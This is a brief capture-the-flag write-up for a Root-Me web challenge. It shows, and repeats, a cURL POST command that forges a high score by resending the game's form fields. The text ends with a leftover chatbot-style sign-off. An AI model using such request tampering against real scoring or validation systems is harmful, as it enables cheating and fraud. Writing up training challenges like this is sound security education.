Title: Bypassing Score Validation in a Web Game
Primary topic: Web Exploitation
Secondary topic: POST Request
Tools used: cURL
Keywords: POST request, score validation

#context
With this challenge, we are greeted with a fun little game that generates a random number every time you click the button.

#discovery
After seeing the source code, we see that the button sends a POST request with two values: generate and score.

#exploitation
We can use cURL to send a POST request with a score over 999999 (If you send a POST request with just a score parameter, it won’t work, make sure to include the generate value as well). We can use the cURL command:
curl --request POST --form 'generate=Give+a+try%21' --form 'score=1000000' http://challenge01.root-me.org/web-serveur/ch56/

#code
curl --request POST --form 'generate=Give+a+try%21' --form 'score=1000000' http://challenge01.root-me.org/web-serveur/ch56/
```

I hope this meets your requirements. Let me know if you have any further questions or concerns.
